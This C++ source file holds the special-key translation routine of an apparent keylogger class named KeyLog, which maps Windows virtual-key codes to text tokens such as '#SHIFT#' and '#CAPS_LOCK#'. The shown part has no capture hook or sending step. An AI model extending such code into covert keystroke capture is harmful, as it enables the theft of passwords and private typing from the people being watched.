#include "KeyLog.h"
#include <windows.h>

bool KeyLog::SpecialKeys(int S_Key, char key[]) {
    switch (S_Key) {
    case VK_SPACE:
        memcpy(key, " ", sizeof(" "));
        return true;
    case VK_RETURN:
        memcpy(key, "\n", sizeof("\n"));
        return true;
    case '¾':
        memcpy(key, ".", sizeof("."));
        return true;
    case VK_SHIFT:
        memcpy(key, "#SHIFT#", sizeof("#SHIFT#"));
        return true;
    case VK_BACK:
        memcpy(key, "\b", sizeof("\b"));
        return true;
    case VK_RBUTTON:
        memcpy(key, "#R_CLICK#", sizeof("#R_CLICK#"));
        return true;
    case VK_CAPITAL:
        memcpy(key, "#CAPS_LOCK#", sizeof("#CAPS_LOCK#"));
        return true;
    case VK_TAB:
        memcpy(key, "#TAB", sizeof("#TAB"));
        return true;
    case VK_UP:
        memcpy(key, "#UP", sizeof("#UP"));
        return true;
    case VK_DOWN:
        memcpy(key, "#DOWN", sizeof("#DOWN"));
        return true;
    case VK_LEFT:
        memcpy(key, "#LEFT", sizeof("#LEFT"));
        return true;
    case VK_RIGHT:
        memcpy(key, "#RIGHT", sizeof("#RIGHT"));
        return true;
    case VK_CONTROL:
        memcpy(key, "#CONTROL", sizeof("#CONTROL"));
        return true;
    case VK_MENU:
        memcpy(key, "#ALT", sizeof("#ALT"));
        return true;
    case VK_ESCAPE:
        memcpy(key, "#ESCAPE", sizeof("#ESCAPE"));
        return true;
    default:
        return false;
    }
}
